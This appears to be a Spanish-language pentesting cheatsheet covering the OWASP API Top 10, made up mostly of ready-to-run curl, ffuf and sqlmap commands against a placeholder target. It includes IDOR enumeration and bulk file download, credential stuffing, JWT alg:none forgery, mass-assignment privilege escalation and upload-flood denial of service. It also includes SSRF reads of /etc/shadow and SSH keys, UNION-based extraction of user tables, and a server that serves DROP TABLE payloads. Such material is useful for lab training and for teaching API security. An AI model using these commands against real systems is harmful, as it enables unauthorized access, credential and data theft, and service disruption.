---
title: "API Attacks"
description: "REST API enumeration, mass assignment, broken object auth y rate limit bypass."
sidebar:
  order: 13
  label: "API Attacks"
---
> OWASP API Top 10: enumeración de endpoints, explotación de BOLA/IDOR, broken auth, mass assignment, SSRF, SQLi y más — todo con cURL y ffuf.

---


## Reconocimiento de API

### Localizar documentación

```bash
# Endpoints de documentación comunes
curl -s http://TARGET/docs | jq
curl -s http://TARGET/api-docs | jq
curl -s http://TARGET/openapi.json | jq
curl -s http://TARGET/swagger.json | jq
curl -s http://TARGET/swagger/v1/swagger.json | jq
curl -s http://TARGET/api/v1/swagger | jq

# Buscar spec en source HTML
curl -s http://TARGET/ | grep -iE "swagger|openapi|api-docs|redoc"

# Fuzzing de endpoints (múltiples códigos — 405 = endpoint existe pero método incorrecto)
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://TARGET/api/v1/FUZZ \
     -mc 200,201,204,301,302,405
```

### Autenticación con JWT

```bash
# Login para obtener token
curl -s -X POST http://TARGET/api/v1/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"user@target.htb","password":"P@ssw0rd"}' | jq

# Guardar token
TOKEN=$(curl -s -X POST http://TARGET/api/v1/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"user@target.htb","password":"P@ssw0rd"}' | jq -r '.token')

# Usar token en requests
curl -s http://TARGET/api/v1/resource \
     -H "Authorization: Bearer $TOKEN" | jq

# Registro de usuario
curl -s -X POST http://TARGET/api/v1/user/signup \
     -H "Content-Type: application/json" \
     -d '{"email":"attacker@test.com","password":"Test1234!","name":"Test"}' | jq
```

---

## API1 — BOLA / IDOR (Broken Object Level Authorization)

> Acceder a objetos de otros usuarios cambiando el ID en el path.

### Enumerar IDs con bash

```bash
# Script para iterar IDs y extraer datos de otros usuarios
for i in $(seq 1 200); do
    echo -n "ID $i: "
    curl -s "http://TARGET/api/v1/resource/$i" \
         -H "Authorization: Bearer $TOKEN" | jq -c '.'
done

# Filtrar solo los que devuelven datos (excluir 404/error)
for i in $(seq 1 200); do
    resp=$(curl -s "http://TARGET/api/v1/resource/$i" \
                -H "Authorization: Bearer $TOKEN")
    echo "$resp" | jq -e '.id' > /dev/null 2>&1 && echo "ID $i: $resp"
done
```

### Enumerar IDs con ffuf

```bash
# Generar wordlist de IDs
seq 1 200 > ids.txt

# Fuzz del ID en el path
ffuf -w ./ids.txt \
     -u "http://TARGET/api/v1/resource/FUZZ" \
     -H "Authorization: Bearer $TOKEN" \
     -fr "\"detail\":\"Not found\"" \
     -mc 200

# Ejemplo real: yearly reports de proveedores
ffuf -w ./ids.txt \
     -u "http://TARGET/api/v1/supplier-companies/yearly-reports/FUZZ" \
     -H "Authorization: Bearer $TOKEN" \
     -fr "not found" \
     -mc 200
```

### Descarga masiva de datos BOLA

```bash
# Descargar archivos encontrados (PDF, etc.)
for i in $(seq 1 50); do
    curl -s "http://TARGET/api/v1/files/$i" \
         -H "Authorization: Bearer $TOKEN" \
         -o "file_$i.pdf" 2>/dev/null
    file "file_$i.pdf" | grep -q PDF && echo "Descargado: file_$i.pdf"
done
```

---

## API2 — Broken Authentication

### Credential stuffing con ffuf (dual-wordlist)

```bash
# ffuf con dos wordlists simultáneas
ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt:PASS \
     -w emails.txt:EMAIL \
     -u http://TARGET/api/v1/user/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"Email":"EMAIL","Password":"PASS"}' \
     -fr "Invalid Credentials" \
     -mc 200

# Crear lista de emails objetivo
cat > emails.txt << EOF
admin@target.htb
user@target.htb
john@target.htb
EOF

# Brute-force de password para usuario conocido
ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt \
     -u http://TARGET/api/v1/user/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"Email":"admin@target.htb","Password":"FUZZ"}' \
     -fr "Invalid Credentials" \
     -mc 200
```

### Token JWT — análisis y manipulación

```bash
# Decodificar header y payload (sin verificar firma)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
echo "eyJ1c2VyX2lkIjoiMSIsInJvbGUiOiJ1c2VyIn0" | base64 -d

# Partes del JWT: header.payload.signature
TOKEN="eyJ...header...==.eyJ...payload...==.signature"
PAYLOAD=$(echo $TOKEN | cut -d'.' -f2)
echo $PAYLOAD | base64 -d | jq

# Si la firma no se verifica → modificar payload y re-encodear (alg:none bypass)
# Header: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
# Payload: {"user_id":"1","role":"admin"}
echo -n '{"user_id":"1","role":"admin"}' | base64 | tr -d '='
# JWT sin firma: HEADER.PAYLOAD.
```

---

## API3 — Broken Object Property Level Auth (Mass Assignment)

> Enviar campos extra en el body que el servidor procesa aunque no debería.

```bash
# Request normal de usuario
curl -s -X PATCH http://TARGET/api/v1/user/profile \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"My Company"}'

# Mass Assignment: añadir campos privilegiados
curl -s -X PATCH http://TARGET/api/v1/user/profile \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"My Company","isExemptedFromMarketplaceFee":true}'

# Otros campos típicos a probar:
# "role":"admin"
# "is_admin":true
# "verified":true
# "credit":9999
# "balance":99999
# "subscription":"premium"
# "approved":true

# Confirmar que el campo fue modificado (GET del recurso)
curl -s http://TARGET/api/v1/user/profile \
     -H "Authorization: Bearer $TOKEN" | jq
```

---

## API4 — Unrestricted Resource Consumption

```bash
# Generar archivo grande para DoS/abuso de storage
dd if=/dev/urandom of=test_large.pdf bs=1M count=30   # 30 MB

# Subir múltiples veces para agotar recursos
for i in {1..10}; do
    curl -s -X POST http://TARGET/api/v1/upload \
         -H "Authorization: Bearer $TOKEN" \
         -F "file=@test_large.pdf" | jq
done

# Probar límites de rate:
for i in {1..50}; do
    curl -s -X POST http://TARGET/api/v1/resource \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d '{"query":"test"}' -o /dev/null
done
```

---

## API5 — BFLA (Broken Function Level Authorization)

> Acceder a funciones/endpoints de administrador siendo un usuario normal.

```bash
# Endpoints de admin típicos a probar
curl -s http://TARGET/api/v1/admin/users \
     -H "Authorization: Bearer $USER_TOKEN" | jq

curl -s http://TARGET/api/v1/admin/reports \
     -H "Authorization: Bearer $USER_TOKEN" | jq

# Ver los reports de otro usuario sin ser admin
curl -s "http://TARGET/api/v1/reports?user_id=1" \
     -H "Authorization: Bearer $USER_TOKEN" | jq

# Cambiar método HTTP — GET puede estar protegido, POST no
curl -s -X POST http://TARGET/api/v1/admin/action \
     -H "Authorization: Bearer $USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"userId":1}' | jq

# Probar endpoints con IDs de otros roles
curl -s "http://TARGET/api/v1/partner-companies/1/financials" \
     -H "Authorization: Bearer $USER_TOKEN" | jq
```

---

## API6 — Unrestricted Access to Sensitive Business Flows

```bash
# Identificar datos de negocio expuestos en respuestas
curl -s http://TARGET/api/v1/products \
     -H "Authorization: Bearer $TOKEN" | jq '.[].discount'

# Explotar precios/descuentos expuestos
# Ej: el endpoint devuelve el precio con descuento antes de que expire
curl -s "http://TARGET/api/v1/products/1" \
     -H "Authorization: Bearer $TOKEN" | jq '{price, discountPrice, discountExpiry}'

# Añadir al carrito con precio reducido (si el precio viene del client-side)
curl -s -X POST http://TARGET/api/v1/cart \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"productId":1,"quantity":999,"price":0.01}' | jq

# Race condition para aprovechar ventana de descuento
for i in {1..20}; do
    curl -s -X POST http://TARGET/api/v1/purchase \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d '{"productId":1}' &
done
wait
```

---

## API7 — SSRF via API

```bash
# Identificar campos que aceptan URIs/URLs en el body de la API
# Ejemplo: campo de certificado o archivo en formato URI
curl -s -X POST http://TARGET/api/v1/company \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","CertificateOfIncorporationPDFFileURI":"http://OUR_IP:8000/test"}' | jq

# Listener para confirmar SSRF
nc -lnvp 8000

# LFI via file:// scheme
curl -s -X POST http://TARGET/api/v1/company \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","CertificateOfIncorporationPDFFileURI":"file:///etc/passwd"}' | jq

# Leer el archivo: si el campo URI almacena y luego se hace GET
curl -s "http://TARGET/api/v1/company/1/certificate" \
     -H "Authorization: Bearer $TOKEN"

# Archivos objetivo via SSRF file://
# file:///etc/passwd
# file:///etc/shadow
# file:///proc/self/environ
# file:///var/www/html/config.php
# file:///home/user/.ssh/id_rsa

# Port scan interno via SSRF
seq 1 65535 > ports.txt
ffuf -w ./ports.txt \
     -u http://TARGET/api/v1/resource \
     -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"uri":"http://127.0.0.1:FUZZ"}' \
     -fr "Connection refused"
```

---

## API8 — Security Misconfiguration (SQLi en APIs)

```bash
# SQL Injection en path parameters
# Endpoint: /api/v1/products/{Name}/count
curl -s "http://TARGET/api/v1/products/laptop/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# SQLi básico en el path
curl -s "http://TARGET/api/v1/products/laptop' OR 1=1 --/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# URL-encoded
curl -s "http://TARGET/api/v1/products/laptop%27%20OR%201%3D1%20--/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# UNION-based para extraer datos
curl -s "http://TARGET/api/v1/products/x' UNION SELECT 1,2,3 --/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# Extraer tabla de usuarios
curl -s "http://TARGET/api/v1/products/x' UNION SELECT username,password,email FROM users --/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# SQLi en body JSON
curl -s -X POST http://TARGET/api/v1/search \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"laptop\" OR 1=1 --"}' | jq

# SQLMap contra endpoint de API
sqlmap -u "http://TARGET/api/v1/products/*/count" \
       --headers="Authorization: Bearer $TOKEN" \
       --level=3 --risk=2 --batch
```

---

## API9 — Improper Inventory Management (versiones legacy)

```bash
# Probar versiones antiguas de la API
curl -s http://TARGET/api/v0/user/info \
     -H "Authorization: Bearer $TOKEN" | jq

# Endpoints sin auth en versiones viejas
curl -s http://TARGET/api/v0/admin/users | jq
curl -s http://TARGET/api/v1/users | jq
curl -s http://TARGET/v1/api/users | jq
curl -s http://TARGET/api/users | jq

# Fuzzing de versiones
ffuf -w versions.txt \
     -u http://TARGET/api/FUZZ/users \
     -mc 200,201,401,403,405
# versions.txt: v0, v1, v2, v3, v0.1, v1.0, v1.1, v2.0, beta, dev, internal, old, backup

# Buscar endpoints sin auth en versión v0
for endpoint in users admin reports accounts settings; do
    echo -n "v0/$endpoint: "
    curl -s -o /dev/null -w "%{http_code}" "http://TARGET/api/v0/$endpoint"
    echo ""
done

# Exportar hashes o datos sensibles de endpoint legacy
curl -s http://TARGET/api/v0/users | jq '.[].password_hash'
```

---

## API10 — Unsafe API Consumption

```bash
# Identificar si la API confía en datos de terceros
# Ej: campo que se procesa desde una API externa sin sanitizar

# Verificar qué datos llegan del tercero
curl -s http://THIRD_PARTY_API/data | jq

# Intentar inyección en los datos del tercero si podemos controlarlo
# (crear un servidor que sirva datos maliciosos y usar SSRF para apuntarlo)
python3 -c "
import http.server, json

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        # Datos maliciosos con SQLi/XSS
        data = [{'name': \"'; DROP TABLE users; --\", 'value': '<script>alert(1)</script>'}]
        self.wfile.write(json.dumps(data).encode())
    def log_message(self, *args): pass

http.server.HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
"
```

---

## Tabla de OWASP API Top 10 — Referencia rápida

| # | Vulnerabilidad | Señal clave | Ataque |
|---|----------------|-------------|--------|
| API1 | BOLA/IDOR | IDs secuenciales en URL | Iterar ID, acceder a recursos ajenos |
| API2 | Broken Auth | Login endpoint expuesto | ffuf dual-wordlist, JWT tamper |
| API3 | Mass Assignment | PATCH/POST acepta campos extra | Añadir `"role":"admin"` en body |
| API4 | Unrest. Resource | Upload sin límite | dd 30MB + loop de uploads |
| API5 | BFLA | Funciones admin accesibles | Usar token user en endpoint /admin/ |
| API6 | Business Flow | Precios/descuentos en response | Timing attacks, race conditions |
| API7 | SSRF | Campo URI/URL en body | `file:///etc/passwd`, port scan |
| API8 | Sec. Misconfig | ID o nombre en path param | `' OR 1=1 --`, UNION SELECT |
| API9 | Improper Inv. | API v0, /dev/, /beta/ sin auth | Enumerar versiones viejas |
| API10 | Unsafe Consump. | Datos de terceros procesados | Inyección en datos del proveedor |

---

## Pitfalls / Gotchas

- **BOLA con token propio:** siempre usar el token del usuario normal al acceder a recursos de otros — no usar el token de admin (si lo tienes). El objetivo es demostrar que el user normal puede ver recursos ajenos.
- **ffuf dual-wordlist:** el modo `-w file1:KEYWORD1 -w file2:KEYWORD2` hace producto cartesiano — con 1000 emails × 1000 passwords = 1M requests. Filtrar bien la wordlist de passwords antes.
- **Mass Assignment depende del framework:** Django REST Framework, Laravel, Rails y Express tienen configuraciones diferentes. Probar todos los campos del schema (GET el objeto primero → ver todos los campos).
- **JWT `alg:none`:** muchas librerías modernas no aceptan `alg:none` por defecto. Si falla, intentar `"alg":"HS256"` con firma vacía o HMAC con clave débil.
- **SSRF con file:// puede estar bloqueado:** si `file://` no funciona, probar `http://169.254.169.254/` (AWS metadata) o `http://localhost/` para servicios internos.
- **SQLi en path params URL-encode:** las comillas y espacios en el path necesitan URL encoding: `'` → `%27`, ` ` → `%20`, `--` → `%2D%2D`. Algunos servidores rechazan doble encoding.
- **API v0 puede requerir auth diferente:** versiones legacy a veces usan Basic Auth en lugar de JWT. Probar `Authorization: Basic YWRtaW46YWRtaW4=` (admin:admin).
- **405 Method Not Allowed = endpoint existe:** nunca ignorar un 405 — el endpoint existe pero el método está prohibido. Probar GET, POST, PUT, PATCH, DELETE en ese endpoint.
- **Documentación Swagger es el mapa completo:** si hay `/openapi.json`, leerlo entero — lista todos los endpoints, parámetros, schemas y códigos de respuesta. Es el mayor hallazgo de recon.

---

## Cheatsheets relacionados

- [Web Fuzzing](/metodologias/recon/web-fuzzing/) — ffuf para descubrimiento de endpoints de API
- [Web Requests](/metodologias/fundamentos/web-requests/) — cURL para operaciones CRUD en APIs
- [Broken Authentication](/metodologias/web/broken-authentication/) — técnicas de brute-force aplicables a APIs
- [Server-side Attacks](/metodologias/web/server-side-attacks/) — SSRF en profundidad
- [Attacking GraphQL](/metodologias/web/attacking-graphql/) — APIs GraphQL
